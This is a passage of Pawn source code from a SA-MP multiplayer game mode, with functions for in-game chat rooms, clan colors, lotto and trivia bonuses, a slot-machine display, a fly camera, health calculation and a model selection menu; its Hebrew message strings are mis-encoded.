				Chat_Write(tmp,string);
			}
		}
		if(!left) Chat_Close(tmp);
		else if(chatinfo[tmp][chatManager] == playerid) return chatinfo[tmp][chatManager] = firstfound;
	}
	return INVALID_PLAYER_ID;
}
//=[Chat_Close]=================================================================
stock Chat_Close(chatid,bool:hasplayers=false)
{
	if(hasplayers) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inchat] == chatid) Chat_Quit(i,false);
	chatinfo[chatid][chatValid] = false;
	format(chatinfo[chatid][chatTitle],32,"");
	chatinfo[chatid][chatColor] = grey;
	chatinfo[chatid][chatManager] = INVALID_PLAYER_ID;
	return 1;
}
//=[Chat_Write]=================================================================
stock Chat_Write(chatid,text[],bool:update=true,playerid=INVALID_PLAYER_ID)
{
	new string[M_S], curpvar[M_S];
	if(playerid == INVALID_PLAYER_ID) format(string,sizeof(string),"* [%s] %s",GetTimeAsString(true),text);
	else format(string,sizeof(string),"{%s}* [%s] {%s}%s:{%s} %s",HexStringOfColor(chatinfo[playerinfo[playerid][inchat]][chatColor]),GetTimeAsString(true),HexStringOfColor(GetPlayerColor(playerid)),GetName(playerid),HexStringOfColor(chatinfo[playerinfo[playerid][inchat]][chatColor]),text);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inchat] == chatid)
	{
		for(new j = MAX_CHAT_LINES-1; j >= 1; j--)
		{
			GetPVarString(i,cl(j),curpvar,sizeof(curpvar));
			SetPVarString(i,cl(j+1),curpvar);
		}
		SetPVarString(i,cl(1),string);
		if(update && !playerinfo[i][minchat] && playerinfo[i][indialog] == -1) Chat_Update(i);
		if(update && playerinfo[i][minchat] && i != playerid && playerid != INVALID_PLAYER_ID)
		{
			format(string,sizeof(string)," (/chat :ьў°щрф .%s фхуЄф чу∙ф сЎ'рш юр·)",GetName(playerid));
			SendClientMessage(i,grey,string);
		}
	}
	return 1;
}
//=[Chat_Update]================================================================
stock Chat_Update(playerid,msg[]="")
{
	assert playerinfo[playerid][inchat] != INVALID_PLAYER_ID;
	new fullchat[100 + MAX_CHAT_LINES * 80], tmp[M_S];
	for(new i = MAX_CHAT_LINES; i >= 1; i--)
	{
		GetPVarString(playerid,cl(i),tmp,sizeof(tmp));
		if(strlen(tmp) > 0) format(fullchat,sizeof(fullchat),"%s%s\n",fullchat,tmp);
	}
	format(fullchat,sizeof(fullchat),"\t\t{%s}[·р°щъ: %s || ∙Єф: %s || фЎ'рш ЁхЎ° с∙Єф: %s || фЎш°Ї· с∙Єф: %s]\t\t\n\n%s",HexStringOfColor(chatinfo[playerinfo[playerid][inchat]][chatColor]),GetDateAsString(),GetTimeAsString(),chatinfo[playerinfo[playerid][inchat]][chatCreationTime],playerinfo[playerid][chatjointime],fullchat);
	if(strlen(msg) > 0) format(fullchat,sizeof(fullchat),"%s\n" @c(red) "---\n%s",fullchat,msg);
	format(tmp,sizeof(tmp),"{%s}Ў'рш: %s",HexStringOfColor(chatinfo[playerid][chatColor]),chatinfo[playerinfo[playerid][inchat]][chatTitle]);
	ShowPlayerDialog(playerid,dialog_chat,DIALOG_STYLE_INPUT,tmp,fullchat,"∙ьч","рЇ∙°хщх·");
	return 1;
}
//=[GetColorFromClanDialog]=====================================================
stock GetColorFromClanDialog(playerid,inputtext[],cland)
{
	if(!strlen(inputtext)) return ClanDialog(playerid,cland,".RGB Єьщъ ьфўьщу ∙э ∙ь ЎсЄ рх юёЇ°щ"), 0;
	new cmdType = 0, colID = -1, rgb[3] = {-1,-1,-1}, theColor = 0, s[64], idx = 0;
	for(new i = 0; i < sizeof(Colors); i++) if(equal(inputtext,Colors[i][colName])) colID = i;
	if(colID != -1) cmdType = 1;
	else
	{
		for(new i = 0; i < 3; i++) s = strtok(inputtext,idx), rgb[i] = strval(s);
		if(rgb[0] < 0 || rgb[0] > 255 || rgb[1] < 0 || rgb[1] > 255 || rgb[2] < 0 || rgb[2] > 255) return ClanDialog(playerid,cland,".∙фўьу· ьр ЁыхЁщэ (RGB) юёЇ°щ фЎсЄ"), 0;
		else cmdType = 2;
	}
	if(!cmdType) return ClanDialog(playerid,cland,".Ўх°· ф∙щюх∙ ∙тхщф, рх ∙∙э фЎсЄ ∙фўьу· ьр ўщщэ"), 0;
	switch(cmdType)
	{
		case 1:
		{
			if(Colors[colID][colHex] == 0x000000FF || Colors[colID][colHex] == 0xFFFFFFFF) return ClanDialog(playerid,cland,".ьр Ёщ·я ь∙Ёх· ьЎсЄ фцф"), 0;
			theColor = Colors[colID][colHex];
		}
		case 2:
		{
			if(IsWBColor(rgb[0],rgb[1],rgb[2])) return ClanDialog(playerid,cland,".фЎсЄ фцф ухюф юущ ьЎсЄ ься / ∙чх°"), 0;
			theColor = rgba2hex(rgb[0],rgb[1],rgb[2],255);
		}
	}
	return theColor;
}
//=[GenerateRandomName]=========================================================
stock GenerateRandomName(startswith[],endswith[],middle)
{
	new returned[MAX_PLAYER_NAME], chars[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_[]().@$";
	for(new i = 0; i < middle; i++) format(returned,sizeof(returned),"%s%c",returned,chars[random(sizeof(chars))]);
	format(returned,sizeof(returned),"%s%s%s",startswith,returned,endswith);
	return returned;
}
//=[EndBriefcase]===============================================================
stock EndBriefcase(reason[],adminid)
{
	new string[M_S];
	assert briefcaseinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .ЇЄщьх· фюцххуф схшьф");
	else format(string,sizeof(string)," .%s ЇЄщьх· фюцххуф схшьф Єь щущ фрующя",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][inbriefcase] || playerinfo[i][waitbriefcase]))
	{
		if(playerinfo[i][inbriefcase])
		{
			SpawnPlayer(i);
			SetPlayerInterior(i,0);
			SetFreeze(i,0);
			SetPlayerVirtualWorld(i,world_normal);
			SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙ЇЄщьх· фюцххуф схшьф");
			GiveMoney(i,join_act);
		}
		playerinfo[i][inbriefcase] = 0, playerinfo[i][waitbriefcase] = 0;
		playerinfo[i][inact] = 0;
	}
	DestroyPickupEx(briefcaseinfo[5]);
	briefcaseinfo[0] = 0, briefcaseinfo[1] = 0, briefcaseinfo[2] = 0, briefcaseinfo[4] = 0;
	KillTimer(briefcaseinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[SetVehicleRandomNumberPlate]================================================
stock SetVehicleRandomNumberPlate(v)
{
	new string[32];
	switch(random(26))
	{
		case 0: string = "Super";
		case 1: string = "Duper";
		case 2: string = "Mega";
		case 3: string = "Ultra";
		case 4: string = "Amazing";
		case 5: string = "Splendid";
		case 6: string = "Fantastic";
		case 7: string = "Extreme";
		case 8: string = "WOW";
		case 9: string = "Great";
		case 10: string = "Power";
		case 11: string = "GOD";
		case 12: string = "Idiot";
		case 13: string = "Pro";
		case 14: string = "Game";
		case 15: string = "Crazy";
		case 16: string = "Evil";
		case 17: string = "Sexy";
		case 18: string = "Scary";
		case 19: string = "Incredible";
		case 20: string = "HELL";
		case 21: string = "Strong";
		case 22: string = "Mighty";
		case 23: string = "Muscular";
		case 24: string = "Boom";
		case 25: string = "SLAP";
	}
	SetVehicleNumberPlate(v,string);
}
//=[GiveChatActivityBonus]======================================================
stock GiveChatActivityBonus(playerid,id)
{
	assert CActID == ChatActivityBonus[id][cabActivity];
	playerinfo[playerid][actbonus] = true;
	new string[M_S], head[64], n[2] = {-1,-1};
	switch(ChatActivityBonus[id][cabUniqueID])
	{
		case 0b00000000:
		{
			do n[0] = randomEx(10,41);
			while n[0] == lottonum[0];
			format(string,sizeof(string),@c(green) "хф°юц фхр...\n!фюёЇ° ∙ь фьхшх %s юфюёЇ° %d",lottonum[0] < n[0] ? ("Ёюхъ") : ("тсхф"),n[0]);
		}
		case 0b00000001:
		{
			do n[0] = randomEx(8,25), n[1] = randomEx(8,25);
			while n[0] == lottonum[0] || n[1] == lottonum[0] || n[0] == n[1];
			format(string,sizeof(string),@c(green) "хф°юц фЄсф фхр...\n!фюёЇ° ∙ь фьхшх ЁюЎр сщя %d ь %d",lottonum[0] - n[0] < 1 ? 1 : (lottonum[0] - n[0]),lottonum[0] + n[1] > 50 ? 50 : (lottonum[0] + n[1]));
		}
		case 0b00000010:
		{
			playerinfo[playerid][lottoquestion] = -1;
			ShowPlayerConstDialog(playerid,dialog_lottoquestion);
			return;
		}
		case 0b00000011:
		{
			do n[0] = randomEx(1,4);
			while n[0] == trivia[0];
			format(string,sizeof(string),@c(green) "!·∙хсф юёЇ° %d фщр ьр ф·∙хсф фЁыхЁф",n[0]);
		}
		case 0b00000100, 0b00000101: format(string,sizeof(string),@c(green) "!Ёхёє ёщыхщ цыщщф%s",(playerinfo[playerid][wolmul] = ChatActivityBonus[id][cabUniqueID] == 0b00000100 ? 1 : 2) == 2 ? (" чцў") : (""));
	}
	format(head,sizeof(head),@c(lightblue) "ўЁщ· р· фсхЁхё: %s",ChatActivityBonus[id][cabName]);
	ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,head,string,"OK","");
}
//=[GamblingFunction]===========================================================
stock GamblingFunction(playerid,func[],n=0)
{
	if(equal(func,"show"))
	{
		if(playerinfo[playerid][gambleimg][0] == INVALID_PLAYER_TEXT_DRAW)
		{
			playerinfo[playerid][gambleimg][0] = CreatePlayerTextDraw(playerid,173.000000,200.000000,"ld_slot:grapes");
			PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][gambleimg][0],255);
			PlayerTextDrawFont(playerid,playerinfo[playerid][gambleimg][0],4);
			PlayerTextDrawLetterSize(playerid,playerinfo[playerid][gambleimg][0],0.500000,1.000000);
			PlayerTextDrawColor(playerid,playerinfo[playerid][gambleimg][0],-1);
			PlayerTextDrawSetOutline(playerid,playerinfo[playerid][gambleimg][0],0);
			PlayerTextDrawSetProportional(playerid,playerinfo[playerid][gambleimg][0],1);
			PlayerTextDrawSetShadow(playerid,playerinfo[playerid][gambleimg][0],1);
			PlayerTextDrawUseBox(playerid,playerinfo[playerid][gambleimg][0],1);
			PlayerTextDrawBoxColor(playerid,playerinfo[playerid][gambleimg][0],255);
			PlayerTextDrawTextSize(playerid,playerinfo[playerid][gambleimg][0],100.000000,100.000000);
			playerinfo[playerid][gambleimg][1] = CreatePlayerTextDraw(playerid,283.000000,200.000000,"ld_slot:cherry");
			PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][gambleimg][1],255);
			PlayerTextDrawFont(playerid,playerinfo[playerid][gambleimg][1],4);
			PlayerTextDrawLetterSize(playerid,playerinfo[playerid][gambleimg][1],0.500000,2.000000);
			PlayerTextDrawColor(playerid,playerinfo[playerid][gambleimg][1],-1);
			PlayerTextDrawSetOutline(playerid,playerinfo[playerid][gambleimg][1],0);
			PlayerTextDrawSetProportional(playerid,playerinfo[playerid][gambleimg][1],1);
			PlayerTextDrawSetShadow(playerid,playerinfo[playerid][gambleimg][1],1);
			PlayerTextDrawUseBox(playerid,playerinfo[playerid][gambleimg][1],1);
			PlayerTextDrawBoxColor(playerid,playerinfo[playerid][gambleimg][1],255);
			PlayerTextDrawTextSize(playerid,playerinfo[playerid][gambleimg][1],100.000000,100.000000);
			playerinfo[playerid][gambleimg][2] = CreatePlayerTextDraw(playerid,393.000000,200.000000,"ld_slot:bell");
			PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][gambleimg][2],255);
			PlayerTextDrawFont(playerid,playerinfo[playerid][gambleimg][2],4);
			PlayerTextDrawLetterSize(playerid,playerinfo[playerid][gambleimg][2],0.500000,1.000000);
			PlayerTextDrawColor(playerid,playerinfo[playerid][gambleimg][2],-1);
			PlayerTextDrawSetOutline(playerid,playerinfo[playerid][gambleimg][2],0);
			PlayerTextDrawSetProportional(playerid,playerinfo[playerid][gambleimg][2],1);
			PlayerTextDrawSetShadow(playerid,playerinfo[playerid][gambleimg][2],1);
			PlayerTextDrawUseBox(playerid,playerinfo[playerid][gambleimg][2],1);
			PlayerTextDrawBoxColor(playerid,playerinfo[playerid][gambleimg][2],255);
			PlayerTextDrawTextSize(playerid,playerinfo[playerid][gambleimg][2],100.000000,100.000000);
			new str[16];
			format(str,sizeof(str),"- %d$",playerinfo[playerid][gambleinfo][1]);
			playerinfo[playerid][gambleimg][3] = CreatePlayerTextDraw(playerid,221.000000,280.000000,str);
			PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][gambleimg][3],255);
			PlayerTextDrawFont(playerid,playerinfo[playerid][gambleimg][3],1);
			PlayerTextDrawLetterSize(playerid,playerinfo[playerid][gambleimg][3],0.500000,1.400000);
			PlayerTextDrawColor(playerid,playerinfo[playerid][gambleimg][3],184169135);
			PlayerTextDrawSetOutline(playerid,playerinfo[playerid][gambleimg][3],0);
			PlayerTextDrawSetProportional(playerid,playerinfo[playerid][gambleimg][3],1);
			PlayerTextDrawSetShadow(playerid,playerinfo[playerid][gambleimg][3],0);
		}
		for(new i = 0; i < 4; i++)
		{
			if(i < 3) TextDrawShowForPlayer(playerid,gambletxt[i]);
			PlayerTextDrawShow(playerid,playerinfo[playerid][gambleimg][i]);
		}
		playerinfo[playerid][gambleinfo][0] = 1;
		SelectTextDraw(playerid,lightblue);
	}
	else if(equal(func,"rand"))
	{
		new gambleTXDs[][16] = {"ld_slot:bar1_o","ld_slot:bar2_o","ld_slot:bell","ld_slot:cherry","ld_slot:grapes"};
		PlayerTextDrawSetString(playerid,playerinfo[playerid][gambleimg][n-1],gambleTXDs[playerinfo[playerid][gambleinfo][n+2] = random(sizeof(gambleTXDs))]);
	}
	else if(equal(func,"end"))
	{
		for(new i = 0; i < 4; i++)
		{
			if(i < 3) TextDrawHideForPlayer(playerid,gambletxt[i]);
			PlayerTextDrawHide(playerid,playerinfo[playerid][gambleimg][i]);
		}
		playerinfo[playerid][gambleinfo][0] = 0, playerinfo[playerid][gambleinfo][1] = 0;
	}
	return 1;
}
//=[LowPriorityKick]============================================================
stock LowPriorityKick(playerid) return (playerinfo[playerid][noupdate] = 1, playerinfo[playerid][nomsg] = 1, playerinfo[playerid][kicktime] = 2), 1;
//=[silpvar]====================================================================
stock silpvar(silid,var[])
{
	new str[32];
	format(str,sizeof(str),"sil%02d%s",silid,var);
	return str;
}
//=[CheckForSpam]===============================================================
stock CheckForSpam(playerid,silid)
{
	if(GetTickCount() - GetPVarInt(playerid,silpvar(silid,"tick")) <= 500)
	{
		new w = GetPVarInt(playerid,silpvar(silid,"warns"));
		SetPVarInt(playerid,silpvar(silid,"tick"),++w);
		if(w % 5 == 0 && w > 0) SendClientMessage(playerid,0x66CCCC," (/silence :·цых°·: ·ющу ·хыь ьф∙·щў цюЁщ· р· фхуЄх· рьх)");
	}
	SetPVarInt(playerid,silpvar(silid,"tick"),GetTickCount());
}
//=[UpdateServerMessage]========================================================
stock UpdateServerMessage()
{
	serverMsg = "", serverMsgExist = 0;
	if(fexist(file_srvmessage))
	{
		new File:f = fopen(file_srvmessage,io_read), string[M_S];
		if(f)
		{
			while(fread(f,string,sizeof(string),false) && f) format(serverMsg,sizeof(serverMsg),"%s%s",serverMsg,string);
			fclose(f);
			serverMsgExist = 1;
		}
	}
}
//=[RetrievePasswordMail]=======================================================
forward RetrievePasswordMail(index,response_code,data[]);
public RetrievePasswordMail(index,response_code,data[]) return ShowPlayerDialog(index,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙чцх° ёщёюр у°ъ фющщь",response_code == 200 && data[0] == 'T' ? (@c(green) ".фхЄс°ф сфЎьчф фхуЄф ьы·хс· фющщь ∙ь фю∙·ю∙ рьщх сщў∙· ∙чцх° ёщёюр") : (@c(red) ".∙ьщч· фющщь Ёы∙ьф, Ёёф ∙хс юрхч° щх·°"),"OK","");
//=[IsPlayerUsingSGuard_]=======================================================
stock IsPlayerUsingSGuard_(playerid) return IsPlayerUsingSGuard(playerid);
//=[ClanCameraOff]==============================================================
stock ClanCameraOff(playerid)
{
	assert playerinfo[playerid][clancam] > -1;
	TogglePlayerSpectating(playerid,0);
	SetCameraBehindPlayer(playerid);
	new string[M_S];
	format(string,sizeof(string)," * ёщщэ ьЎЇх· сюЎьюф юёЇ° %d %s",playerinfo[playerid][clancam]+1,GetName(playerid));
	ClanNotification(playerinfo[playerid][clan],string);
	for(new i = 0; i < sizeof(badcamera); i++) TextDrawHideForPlayer(playerid,badcamera[i]);
	playerinfo[playerid][clancam] = -1;
}
//=[MoveCamera]=================================================================
stock MoveCamera(playerid)
{
	if(playerinfo[playerid][flyspeed] <= 1.0) playerinfo[playerid][flyspeed] += 0.03;
	new Float:FV[3], Float:CP[3], Float:p[3], Float:s = 75.0 * playerinfo[playerid][flyspeed];
	GetPlayerCameraPos(playerid,CP[0],CP[1],CP[2]);
    GetPlayerCameraFrontVector(playerid,FV[0],FV[1],FV[2]);
	GetNextCameraPosition(playerinfo[playerid][flymode][1],CP,FV,p[0],p[1],p[2]);
	MovePlayerObject(playerid,playerinfo[playerid][flyobject],p[0],p[1],p[2],s);
	playerinfo[playerid][flymode][2] = GetTickCount();
	return 1;
}
//=[GetNextCameraPosition]======================================================
stock GetNextCameraPosition(move_mode,Float:CP[3],Float:FV[3],&Float:X,&Float:Y,&Float:Z)
{	// an improved version of h02's calculations of next position
    #define OFFSET_X (FV[0]*6000.0)
	#define OFFSET_Y (FV[1]*6000.0)
	#define OFFSET_Z (FV[2]*6000.0)
	switch(move_mode)
	{
		case 1: X = CP[0]+OFFSET_X, Y = CP[1]+OFFSET_Y, Z = CP[2]+OFFSET_Z;
		case 2: X = CP[0]-OFFSET_X, Y = CP[1]-OFFSET_Y, Z = CP[2]-OFFSET_Z;
		case 3: X = CP[0]-OFFSET_Y, Y = CP[1]+OFFSET_X, Z = CP[2];
		case 4: X = CP[0]+OFFSET_Y, Y = CP[1]-OFFSET_X, Z = CP[2];
		case 5: X = CP[0]+(OFFSET_X  - OFFSET_Y), Y = CP[1]+(OFFSET_Y  + OFFSET_X), Z = CP[2]+OFFSET_Z;
		case 6: X = CP[0]+(OFFSET_X  + OFFSET_Y), Y = CP[1]+(OFFSET_Y  - OFFSET_X), Z = CP[2]+OFFSET_Z;
		case 7: X = CP[0]+(-OFFSET_X - OFFSET_Y), Y = CP[1]+(-OFFSET_Y + OFFSET_X), Z = CP[2]-OFFSET_Z;
		case 8: X = CP[0]+(-OFFSET_X + OFFSET_Y), Y = CP[1]+(-OFFSET_Y - OFFSET_X), Z = CP[2]-OFFSET_Z;
	}
	#undef OFFSET_X
	#undef OFFSET_Y
	#undef OFFSET_Z
}
//=[StartFlyMode]===============================================================
stock StartFlyMode(playerid,Float:x,Float:y,Float:z)
{
	TogglePlayerSpectating(playerid,1);
	playerinfo[playerid][flyobject] = CreatePlayerObject(playerid,19300,x,y,z,0.0,0.0,0.0);
	AttachCameraToPlayerObject(playerid,playerinfo[playerid][flyobject]);
	playerinfo[playerid][flymode][0] = 1;
}
//=[StopFlyMode]================================================================
stock StopFlyMode(playerid,&Float:x,&Float:y,&Float:z)
{
	TogglePlayerSpectating(playerid,0);
	if(IsValidPlayerObject(playerid,playerinfo[playerid][flyobject]) && playerinfo[playerid][flymode][0])
	{
		GetPlayerObjectPos(playerid,playerinfo[playerid][flyobject],x,y,z);
		DestroyPlayerObject(playerid,playerinfo[playerid][flyobject]);
	}
	playerinfo[playerid][flymode][0] = 0;
}
//=[CalculateHealth]============================================================
stock CalculateHealth(&Float:h,&Float:a,Float:amount,Float:maxh=100.0,Float:maxa=100.0)
{
	assert amount != 0.0;
	if(amount > 0.0)
	{
		if(h + amount >= maxh)
		{
			amount -= maxh - h, h = maxh;
			if(a + amount >= maxa) amount -= maxa - a, a = maxa;
			else a += amount;
		}
		else h += amount;
	}
	else
	{
		if(a > 0.0)
		{
			if(a + amount <= 0.0) amount -= a, a = 0.0;
			else a += amount;
		}
		if(a <= 0.0) h = (h + amount) <= 0.0 ? 0.0 : (h + amount);
	}
}
//=[act_Code]===================================================================
stock act_Code(actid,subint=-999,sub[]="")
{
	new ret[32], substr[32];
	if(subint != -999) valstr(substr,subint);
	else format(substr,sizeof(substr),sub);
	format(ret,sizeof(ret),"Act_%s%s%s",ActivityIDs[actid][aidUID],!strlen(substr) ? ("") : ("_"),substr);
	return ret;
}
//=[act_SaveWin]================================================================
stock act_SaveWin(playerid,actcode[])
{
	assert playerinfo[playerid][logged];
	new cur = fgetint(fuser(playerid),actcode);
	fsetint(fuser(playerid),actcode,cur+1);
	SetPVarInt(playerid,actcode,cur+1);
}
//=[act_LoadWin]================================================================
stock act_LoadWin(playerid,actcode[],amount)
{
	assert playerinfo[playerid][logged];
	SetPVarInt(playerid,actcode,amount);
}
//=[act_GetWins]================================================================
stock act_GetWins(playerid,actcode[]) return GetPVarInt(playerid,actcode);
//=[act_GetCategoryIndex]=======================================================
stock act_GetCategoryIndex(actid,index)
{
	new ret[32];
	if(!ActivityIDs[actid][aidIsCategory]) return ret;
	switch(actid)
	{
		case aid_races:
		{
			switch(index)
			{
				case race1_cars: format(ret,sizeof(ret),"Cars");
				case race2_bikes: format(ret,sizeof(ret),"Bikes");
				case race3_planes: format(ret,sizeof(ret),"Planes");
				case race4_boats: format(ret,sizeof(ret),"Boats");
				case race5_crazy: format(ret,sizeof(ret),"Crazy");
				case race6_tires: format(ret,sizeof(ret),"Tires");
				case race7_invcars: format(ret,sizeof(ret),"InvCars");
				case race8_waterdrive: format(ret,sizeof(ret),"WaterDrive");
			}
		}
		case aid_sraces: format(ret,sizeof(ret),SRaceTypes[index][srName]);
		case aid_ewar: format(ret,sizeof(ret),ewars[index][ewName]);
		case aid_wargames: format(ret,sizeof(ret),warGames[index][wgName]);
		case aid_manhunt: format(ret,sizeof(ret),ManhuntTypes[index][mhName]);
		case aid_sport:
		{
			switch(index-1)
			{
				case sport1_football: format(ret,sizeof(ret),"Football");
			}
		}
		case aid_teams: format(ret,sizeof(ret),TeamActivities[index][taName]);
		case aid_chat:
		{
			switch(index)
			{
				case 0: ret = "Lotto";
				case 1: ret = "Math";
				case 2: ret = "Trivia";
				case 3: ret = "Reply Test";
				case 4: ret = "WoL";
				case 5: ret = "Double Lotto";
			}
		}
	}
	return ret;
}
//=[act_GetCategoryMax]=========================================================
stock act_GetCategoryMax(actid)
{
	if(!ActivityIDs[actid][aidIsCategory]) return 0;
	switch(actid)
	{
		case aid_races: return race8_waterdrive + 1;
		case aid_sraces: return sizeof(SRaceTypes);
		case aid_ewar: return sizeof(ewars);
		case aid_wargames: return sizeof(warGames);
		case aid_manhunt: return sizeof(ManhuntTypes);
		case aid_sport: return sport1_football;
		case aid_teams: return sizeof(TeamActivities);
		case aid_chat: return 6;
	}
	return 0;
}
//=[tocodetext]=================================================================
stock tocodetext(str[])
{
	new string[M_S];
	for(new i = 0, j = strlen(str); i < j; i++)
	{
		if(str[i] >= 'A' && str[i] <= 'Z') format(string,sizeof(string),"%s%c",string,str[i]+32);
		else if(str[i] >= 'a' && str[i] <= 'z') format(string,sizeof(string),"%s%c",string,str[i]);
	}
	return string;
}
//=[CheckIfCommandUsed]=========================================================
stock CheckIfCommandUsed(playerid,cmdid,bool:infinitecmd = false)
{
	if(playerinfo[playerid][death][cmdid])
	{
		if(playerinfo[playerid][ammuitems][ai_infinitecmd] && infinitecmd)
		{
			SendClientMessage(playerid,grey," (ф∙·ю∙· сЇўхуф рч°щ ∙ыс° ф∙·ю∙· сф ЇЄэ рч· ьЇчх· сёЇрхя фцф, срюЎЄх· ф·хёє Їўхух· рщЁёхЇщх·)");
			TakeAmmuItemAmmo(playerid,ai_infinitecmd);
			return 0;
		}
		else return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх °ў ьрч° ∙·юх·"), 1;
	}
	playerinfo[playerid][death][cmdid] = 1;
	return 0;
}
//=[propper]====================================================================
stock propper(amount)
{
	//printf("Amount: $%d, Div: %.2f, Total: %.2f",amount,floatdiv(float(propertyPercent),100.0),floatmul(float(amount),floatdiv(float(propertyPercent),100.0)));
	return floatround(floatmul(float(amount),floatdiv(float(propertyPercent),100.0)));
}
//=[UpdateCastleText]===========================================================
stock UpdateCastleText(a,bool:update)
{
	new cstr[M_S+30];
	format(cstr,sizeof(cstr),@c(lightblue) "%d {6DC5F3}:юёЇ° ёщух°щ\n{6DC5F3}∙э фшщ°ф: " @c(lightblue) "%s\n" @c(lightblue) "%d {6DC5F3}:ыюх· фысщ∙х· ∙фщх сшщ°ф цх\n" @c(lightblue) "%d {6DC5F3}:ыюх· фф°щтх· ∙фщх сшщ°ф цх\n" @c(lightblue) "%s {6DC5F3}:юрсщщўш фшщ°ф\n" @c(lightblue) "12/7/2014 {6DC5F3}:·р°щъ Єьщщф ь∙°·",a,CastlesAreas[a][caName],cainfo[a][caCaptures],cainfo[a][caKills],CastlesAreas[a][caAuthor]);
	Update3DTextLabelText(cainfo[a][caText],-1,cstr);
	format(cstr,sizeof(cstr),update ? ("Captures%d") : ("Kills%d"),a);
	fsetint("/DM/Castles.ini",cstr,update ? (cainfo[a][caCaptures]) : (cainfo[a][caKills]));
	return 1;
}
//=[UpdateCasltePlayers]========================================================
stock UpdateCasltePlayers(castleid)
{
    for(new i = 1; i < MAX_CLANS; i++) if(claninfo[i][cvalid]) cainfo[castleid][caClans][i] = 0;
	for(new z = 0; z < MAX_PLAYERS_; z++) if(IsPlayerConnected(z) && !IsPlayerNPC(z) && playerinfo[z][clan] != 0 && playerinfo[z][castle] == castleid) cainfo[castleid][caClans][playerinfo[z][clan]]++;
	return 1;
}
// models test
#define NEXT_TEXT   "Next"
#define PREV_TEXT   "Prev"
#define CANCEL_TEXT "Cancel"
#define BASE_X   	75.0
#define BASE_Y   	130.0
#define WIDTH    	550.0
#define HEIGHT   	180.0
#define DIM_X    	60.0
#define DIM_Y    	70.0
stock model_Create(ModelTypes:id,header[],bgcolor=0x4A5A6BBB,previewcolor=0x88888899,selectcolor=0xFFFF00AA)
{
	Models[mLast] = _:id;
	Models[id] = _:id;
    format(ModelInfo[_:id][mHeader],64,header);
    ModelInfo[_:id][mBackground] = bgcolor;
    ModelInfo[_:id][mPreview] = previewcolor;
    ModelInfo[_:id][mSelect] = selectcolor;
    ModelInfo[_:id][mAmount] = 0;
    return 1;
}
stock model_AddModel(modelid,Float:RotX=0.0,Float:RotY=0.0,Float:RotZ=0.0,Float:Zoom=1.0)
{
	if(ModelInfo[Models[mLast]][mAmount] >= MAX_MODEL_ITEMS) return 0;
	ModelInfo[Models[mLast]][mModels][ModelInfo[Models[mLast]][mAmount]] = modelid;
	ModelInfo[Models[mLast]][mZoom][ModelInfo[Models[mLast]][mAmount]] = Zoom;
	ModelInfo[Models[mLast]][mRotX][ModelInfo[Models[mLast]][mAmount]] = RotX;
	ModelInfo[Models[mLast]][mRotY][ModelInfo[Models[mLast]][mAmount]] = RotY;
	ModelInfo[Models[mLast]][mRotZ][ModelInfo[Models[mLast]][mAmount]] = RotZ;
	ModelInfo[Models[mLast]][mAmount]++;
	return 1;
}
stock model_Show(playerid,ModelTypes:id)
{
    model_DestroySelectionMenu(playerid);
    playerinfo[playerid][pModelPage] = 0;
    playerinfo[playerid][pModelID] = _:id;
    playerinfo[playerid][pModelActive] = true;
	model_CreateTextDraws(playerid,id);
	model_UpdateModels(playerid,id);
	model_UpdatePage(playerid,id);
	SelectTextDraw(playerid,ModelInfo[_:id][mSelect]);
	return 1;
}
stock model_GetPages(ModelTypes:id)
{
	if((ModelInfo[_:id][mAmount]-1 >= SELECTION_ITEMS) && (ModelInfo[_:id][mAmount]-1 % SELECTION_ITEMS) == 0) return (ModelInfo[_:id][mAmount]-1)/SELECTION_ITEMS;
	else return ((ModelInfo[_:id][mAmount]-1)/SELECTION_ITEMS)+1;
}
stock model_HideSelectionMenu(playerid)
{
    model_DestroySelectionMenu(playerid);
	CancelSelectTextDraw(playerid);
	return 1;
}
stock model_DestroySelectionMenu(playerid)
{
	if(playerinfo[playerid][pModelActive])
	{
    	playerinfo[playerid][pModelActive] = false;
		model_DestroyModels(playerid);
		for(new i = 0; i < 6; i++) PlayerTextDrawDestroy(playerid,ModelsText[playerid][i]), ModelsText[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
}
stock model_UpdatePage(playerid,ModelTypes:id)
{
	new string[256];
	format(string,sizeof(string),"%d/%d",playerinfo[playerid][pModelPage]+1,model_GetPages(id));
	return PlayerTextDrawSetString(playerid,ModelsText[playerid][0],string);
}
stock model_UpdateModels(playerid,ModelTypes:id)
{
    new x=0;
	new Float:BaseX = BASE_X;
	new Float:BaseY = BASE_Y - (DIM_Y * 0.33);
	new line = 0;
	new itemat = playerinfo[playerid][pModelPage] * SELECTION_ITEMS;
	model_DestroyModels(playerid);
	while(x != SELECTION_ITEMS && itemat < ModelInfo[_:id][mAmount])
	{
		if(line == 0)
		{
			BaseX = BASE_X+25.0;
			BaseY += DIM_Y + 1.0;
		}
		ModelsSelect[playerid][x] = model_CreateModelTD(playerid,ModelInfo[_:id][mModels][itemat],BaseX,BaseY,ModelInfo[_:id][mRotX][itemat],ModelInfo[_:id][mRotY][itemat],ModelInfo[_:id][mRotZ][itemat],ModelInfo[_:id][mZoom][itemat],DIM_X,DIM_Y,ModelInfo[_:id][mPreview]);
		BaseX += DIM_X + 1.0;
		line++;
		if(line == ITEMS_PER_LINE) line = 0;
		itemat++;
		x++;
	}
}
stock model_DestroyModels(playerid)
{
